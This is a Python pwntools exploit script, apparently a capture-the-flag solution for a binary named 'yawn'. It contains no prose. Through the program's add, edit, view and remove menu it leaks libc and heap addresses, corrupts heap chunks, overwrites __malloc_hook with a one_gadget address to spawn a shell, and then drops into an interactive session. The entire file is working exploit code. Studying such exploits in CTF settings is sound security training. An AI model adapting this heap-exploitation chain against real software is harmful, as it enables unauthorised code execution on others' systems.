
from pwn import *

binary = ELF("yawn")
context.binary = binary

if False:
    io = remote("localhost", 1337)
else:
    # context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    env = {'LD_PRELOAD': "./libc.so.6"}
    io = binary.process(env=env)
    # gdb.attach(io)


def add(name, des, line=True):
    io.sendlineafter(">> ", str(1))
    if line:
        io.sendlineafter("Enter name: ", str(name))
    else:
        io.sendafter("Enter name: ", str(name))
    io.sendlineafter("Enter desc: ", str(des))


def edit(idx, name, size, des, line=True):
    io.sendlineafter(">> ", str(2))
    io.sendlineafter("Enter index: ", str(idx))
    if line:
        io.sendlineafter("Enter name: ", str(name))
    else:
        io.sendafter("Enter name: ", str(name))
    io.sendlineafter("Enter size: ", str(size))
    io.sendlineafter("Enter desc: ", str(des))


def view(idx):
    io.sendlineafter(">> ", str(4))
    io.sendlineafter("Enter idx: ", str(idx))


def remove(idx):
    io.sendlineafter(">> ", str(3))
    io.sendlineafter("Enter idx: ", str(idx))


add("A" * 0x50, p64(0xffffffffffffffff) + p64(0x601fb0), False)
view(0)

io.recvuntil("Description : ")
libc_leak = u64(io.recv(6).ljust(0x8, "\x00"))
libc = libc_leak - 0xf7250
log.info("Libc Leak : " + hex(libc))
__malloc_hook = libc + 0x3c4b10
one_gadget = libc + 0xf02a4

add("A" * 0x50, p64(0xffffffffffffffff)+p64(0x602040), False)
view(1)

io.recvuntil("Description : ")
heap_leak = u64(io.recvline()[:-1].ljust(0x8, "\x00")) - 0x1000
heap = heap_leak & ~0xfff
log.info("Heap Leak : "+hex(heap))

add('AAAA', 'BBBB')
add('AAAA', 'BBBB')
add('AAAA', 'BBBB')

edit(4, "A" * 0x50, 0x100, "C" * 0x8+p64(heap+0x1160), False)
remove(2)
remove(3)
remove(4)

add(p64(__malloc_hook - 0x23), "A" * 0x60)
add('AAAA', 'BBBB')
add('A', 'B')
add('A'*0x13+p64(one_gadget), 'BBBB')
add('A', 'B')


io.interactive()
